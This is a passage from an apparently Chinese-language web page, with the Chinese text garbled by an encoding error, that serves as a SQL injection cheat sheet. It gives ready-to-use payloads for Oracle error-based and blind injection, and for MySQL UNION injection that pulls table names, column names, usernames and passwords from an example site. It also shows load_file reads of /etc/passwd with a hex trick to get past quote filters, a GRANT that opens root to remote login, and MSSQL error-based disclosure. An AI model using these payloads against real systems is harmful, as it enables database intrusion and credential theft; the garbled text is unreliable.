class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> username,passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">3</span>)<span class="hljs-comment">--</span></span></code></pre></div></div><h3 id="æŠ¥é”™æ³¨å…¥-1"><a href="#æŠ¥é”™æ³¨å…¥-1" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a><strong>æŠ¥é”™æ³¨å…¥</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> v$version <span class="hljs-keyword">where</span> banner <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;Oracle%))--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> rownum <span class="hljs-keyword">as</span> limit,table_name <span class="hljs-keyword">from</span> user_tables) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span> <span class="hljs-number">3</span>))<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;</span>USERS<span class="hljs-string">&#x27;) where limit=3))--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> passwd <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> passwd,rownum <span class="hljs-keyword">as</span> limit <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">where</span> limit<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-comment">--</span></span></code></pre></div></div><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a><strong>å¸ƒå°”ç›²æ³¨</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=(select decode(user,&#x27;</span><span class="hljs-keyword">SYSTEM</span><span class="hljs-string">&#x27;,1,0,0) from dual)--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-comment">--</span></span><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(user,1,1))&gt; 64--</span></span></code></pre></div></div><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a><strong>æ—¶é—´ç›²æ³¨</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;</span>a<span class="hljs-string">&#x27;,5) else 1 end)--</span></span><span class="line"><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> ascii(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span> <span class="hljs-number">64</span> <span class="hljs-keyword">then</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>)<span class="hljs-comment">--</span></span></code></pre></div></div><p><strong>SQLæ‰‹å·¥æ³¨å…¥</strong>  </p><hr><h3 id="åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨"><a href="#åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨"></a><strong>åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨</strong></h3><p><strong>æ•°å­—å‹æ³¨å…¥</strong></p><p>urlåè¾“å…¥</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><span class="line"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span></span></code></pre></div></div><p>å¦‚è¿”å›ä¸åŒï¼Œåˆ™å¯åˆ¤æ–­æ³¨å…¥ç‚¹å­˜åœ¨  </p><p>ä¾‹ï¼š</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â è¿”å›é”™è¯¯</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>Â Â and 1=1 è¿”å›æ­£ç¡®</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â and 1=2 è¿”å›é”™è¯¯</p><p><strong>å­—ç¬¦å‹æ³¨å…¥</strong></p><p>urlåè¾“å…¥</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-string">&#x27; and 1=1 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></span><span class="line"><span class="hljs-string">&#x27; and 1=2 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></span></code></pre></div></div><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â è¿”å›é”™è¯¯  </p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â and 1=1 and â€˜1â€™=â€™1 è¿”å›æ­£ç¡®</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>Â  and 1=2 and â€˜1â€™=â€™1 è¿”å›é”™è¯¯</p><p><strong>æœç´¢å‹æ³¨å…¥</strong></p><p>è¾“å…¥æ¡†ä¸­è¾“å…¥</p><p><code>&#39;</code> è¿”å›é”™è¯¯</p><p>x%â€™ and 1=1 and â€˜%â€™=â€™ è¿”å›æ­£ç¡®</p><p>x%â€™ and 1=2 and â€˜%â€™=â€™ è¿”å›é”™è¯¯</p><h3 id="åˆ¤æ–­å­—æ®µæ•°"><a href="#åˆ¤æ–­å­—æ®µæ•°" class="headerlink" title="åˆ¤æ–­å­—æ®µæ•°"></a><strong>åˆ¤æ–­å­—æ®µæ•°</strong></h3><p><strong>æ•°å­—å‹</strong></p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â Â order by 26 è¿”å›æ­£ç¡®</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â order by 27 è¿”å›é”™è¯¯</p><p>å¾—å‡ºç»“è®ºï¼šå­—æ®µæ•°26ã€‚</p><p><strong>å­—ç¬¦å‹</strong></p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a>Â Â Â order by 26 # è¿”å›æ­£ç¡®</p><p><a href="http://www.xxx.cn/news.php?p=1&amp;id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> Â order by 27 # è¿”å›é”™è¯¯</p><p>å¾—å‡ºç»“è®ºï¼šå­—æ®µæ•°26ã€‚</p><p><strong>æœç´¢å‹</strong></p><p>x%â€™ order by 26 # è¿”å›æ­£ç¡®</p><p>x%â€™ order by 27 # è¿”å›é”™è¯¯</p><p>å¾—å‡ºç»“è®ºï¼šå­—æ®µæ•°26ã€‚</p><h3 id="å¯»æ‰¾å¯æ˜¾ç¤ºå­—æ®µ"><a href="#å¯»æ‰¾å¯æ˜¾ç¤ºå­—æ®µ" class="headerlink" title="å¯»æ‰¾å¯æ˜¾ç¤ºå­—æ®µ"></a><strong>å¯»æ‰¾å¯æ˜¾ç¤ºå­—æ®µ</strong></h3><p><strong>æ•°å­—å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span> Â <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,....</span></code></pre></div></div><p><strong>å­—ç¬¦å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span> Â <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... #</span></code></pre></div></div><p><strong>æœç´¢å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">x<span class="hljs-operator">%</span><span class="hljs-string">&#x27; and 1=2 union select 1,2,3,4,5,6,7,8,9,.... #</span></span></code></pre></div></div><h3 id="æŸ¥æ•°æ®åº“å"><a href="#æŸ¥æ•°æ®åº“å" class="headerlink" title="æŸ¥æ•°æ®åº“å"></a><strong>æŸ¥æ•°æ®åº“å</strong></h3><p><strong>æ•°å­—å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span>Â Â <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,....</span></code></pre></div></div><p><strong>å­—ç¬¦å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.xxx.cn<span class="hljs-operator">/</span>news.php?p<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">4</span>Â  <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... #</span></code></pre></div></div><p><strong>æœç´¢å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">x<span class="hljs-operator">%</span><span class="hljs-string">&#x27; and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... #</span></span></code></pre></div></div><h3 id="æŸ¥æ•°æ®åº“ä¸­è¡¨å"><a href="#æŸ¥æ•°æ®åº“ä¸­è¡¨å" class="headerlink" title="æŸ¥æ•°æ®åº“ä¸­è¡¨å"></a><strong>æŸ¥æ•°æ®åº“ä¸­è¡¨å</strong></h3><p><strong>æ•°å­—å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>Â Â Â and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27;</span></code></pre></div></div><p>æ•°æ®åº“åä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶</p><p><strong>å­—ç¬¦å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>Â Â Â and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27; #</span></code></pre></div></div><p>æ•°æ®åº“åä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶</p><p><strong>æœç´¢å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">X</span>%&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27; #</span></code></pre></div></div><p>æ•°æ®åº“åä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶</p><h3 id="æŸ¥è¡¨ä¸­çš„åˆ—å"><a href="#æŸ¥è¡¨ä¸­çš„åˆ—å" class="headerlink" title="æŸ¥è¡¨ä¸­çš„åˆ—å"></a><strong>æŸ¥è¡¨ä¸­çš„åˆ—å</strong></h3><p><strong>æ•°å­—å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.columns where table_name=&#x27;è¡¨å&#x27;</span></code></pre></div></div><p>è¡¨åä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶</p><p><strong>å­—ç¬¦å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span> Â and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.columns where table_name=&#x27;è¡¨å&#x27; #</span></code></pre></div></div><p>è¡¨åä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶</p><p><strong>æœç´¢å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">x</span>%&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... from information_schema.columns where table_name=&#x27;è¡¨å&#x27; #</span></code></pre></div></div><p>è¡¨åä¹Ÿå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶</p><h3 id="æŸ¥è¡¨ä¸­çš„æ•°æ®"><a href="#æŸ¥è¡¨ä¸­çš„æ•°æ®" class="headerlink" title="æŸ¥è¡¨ä¸­çš„æ•°æ®"></a><strong>æŸ¥è¡¨ä¸­çš„æ•°æ®</strong></h3><p><strong>æ•°å­—å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span> Â Â and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from è¡¨å</span></code></pre></div></div><p><strong>å­—ç¬¦å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span> Â and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from è¡¨å #</span></code></pre></div></div><p><strong>æœç´¢å‹</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">x</span>%&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... from è¡¨å #</span></code></pre></div></div><p>æ˜¾ç¤ºç‰ˆæœ¬ï¼š<code>select version();</code></p><p>æ˜¾ç¤ºå­—ç¬¦é›†ï¼š<code>select @@character_set_database;</code></p><p>æ˜¾ç¤ºæ•°æ®åº“: <code>show databases;</code></p><p>æ˜¾ç¤ºè¡¨åï¼š<code>show tables;</code></p><p>æ˜¾ç¤ºè®¡ç®—æœºåï¼š<code>select @@hostname;</code></p><p>æ˜¾ç¤ºç³»ç»Ÿç‰ˆæœ¬ï¼š<code>select @@version_compile_os;</code></p><p>æ˜¾ç¤ºmysqlè·¯å¾„ï¼š<code>select @@basedir;</code></p><p>æ˜¾ç¤ºæ•°æ®åº“è·¯å¾„ï¼š<code>select @@datadir;</code></p><p>æ˜¾ç¤ºrootå¯†ç ï¼š<code>select User,Password from mysql.user;</code></p><p>å¼€å¯å¤–è¿ï¼š<code>GRANT ALL PRIVILEGES ONÂ .Â TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION;</code></p><h2 id="MySQLå‡½æ•°åˆ©ç”¨"><a href="#MySQLå‡½æ•°åˆ©ç”¨" class="headerlink" title="MySQLå‡½æ•°åˆ©ç”¨"></a><strong>MySQLå‡½æ•°åˆ©ç”¨</strong></h2><p>MySQLæä¾›äº†<code>load_file()</code>å‡½æ•°ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·å¿«é€Ÿè¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶ä½ç½®å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ–‡ä»¶è·¯å¾„å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œè€Œä¸”éœ€è¦rootæƒé™</p><p>SQLè¯­å¥å¦‚ä¸‹ï¼š<code>union select 1,load_file(â€˜/etc/passwdâ€™),3,4,5 #</code></p><p>é€šå¸¸ï¼Œä¸€äº›é˜²æ³¨å…¥è¯­å¥ä¸å…è®¸å•å¼•å·çš„å‡ºç°ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä¸€ä¸‹è¯­å¥ç»•è¿‡ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-number">0x272F6574632F70617373776427</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> #</span></code></pre></div></div><p>å¯¹è·¯å¾„è¿›è¡Œ16è¿›åˆ¶è½¬æ¢ã€‚</p><h3 id="MSSQLæ‰‹å·¥æ³¨å…¥"><a href="#MSSQLæ‰‹å·¥æ³¨å…¥" class="headerlink" title="MSSQLæ‰‹å·¥æ³¨å…¥"></a><strong>MSSQLæ‰‹å·¥æ³¨å…¥</strong></h3><p>ä¸SQLæ³¨å…¥ä¸åŒçš„æ˜¯ï¼ŒSQLåˆ©ç”¨çš„çˆ†å‡ºæ˜¾ç¤ºçš„å­—æ®µï¼ŒMSSQLåˆ©ç”¨çš„æŠ¥é”™æ³¨å…¥ï¼Œæ’å…¥æ¶æ„çš„sqlè¯­å¥ï¼Œè®©æŸ¥è¯¢æŠ¥é”™ï¼Œåœ¨æŠ¥å‡ºçš„é”™è¯¯ä¸­ï¼Œæ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚</p><p>æ³¨å…¥ç‚¹ï¼š</p><p><a href="http://www.xxx.cn/xxx/xxx.aspx?id=1">www.xxx.cn/xxx/xxx.aspx?id=1</a> </p><h4 id="æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬"><a href="#æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬"></a><strong>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</strong></h4><p><code>@@version</code>ï¼šMSSQLå…¨å±€å˜é‡ï¼Œè¡¨ç¤ºæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p><strong>æµ‹è¯•è¯­å¥ï¼š</strong></p><p><a href="http://www.xxx.cn/xxx/xxx.aspx?id=1">http://www.xxx.cn/xxx/xxx.aspx?id=1</a>Â Â and @@version&gt;0</p><p>æ³¨æ„ï¼šâ€œand @@vsersion&gt;0â€ä¹Ÿå¯ä»¥å†™æˆâ€œand 0/@@version&gt;0â€</p><p><strong>æŠ¥é”™ä¿¡æ¯ï¼š</strong></p><p>åœ¨å°† nvarchar å€¼ â€˜Microsoft SQL Server 2008 R2 (SP3) - 10.50.6000.34 (X64) Aug 19 2014 12:21:34 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64 (Build 7601: Service Pack 1) (Hypervisor)â€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><p><strong>åŸå› </strong>ï¼š</p><p>@@versionæ˜¯MSSQLçš„å…¨å±€å˜é‡</p><p>å¦‚æœæˆ‘ä»¬åœ¨â€œ?id=1â€åé¢åŠ ä¸Šâ€œand @@version&gt;0â€ï¼Œé‚£ä¹ˆâ€œandâ€åé¢çš„è¯­å¥ä¼šå°†â€œ@@versionâ€å¼ºåˆ¶æŠ“æ¢æˆintç±»å‹ä¸0æ¯”è¾ƒå¤§å°ï¼Œä½†æ˜¯ç±»å‹è½¬æ¢å¤±è´¥ï¼Œæ‰€ä»¥å°±å°†æ•°æ®åº“ä¿¡æ¯æš´éœ²å‡ºæ¥ã€‚</p><h4 id="æŸ¥è¯¢è®¡ç®—æœºåç§°"><a href="#æŸ¥è¯¢è®¡ç®—æœºåç§°" class="headerlink" title="æŸ¥è¯¢è®¡ç®—æœºåç§°"></a><strong>æŸ¥è¯¢è®¡ç®—æœºåç§°</strong></h4><p>@@servernameï¼šMSSQLå…¨å±€å˜é‡ï¼Œè¡¨ç¤ºè®¡ç®—æœºåç§°ã€‚</p><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜WINDOWS-XXXXXXâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><h4 id="æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°"><a href="#æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°" class="headerlink" 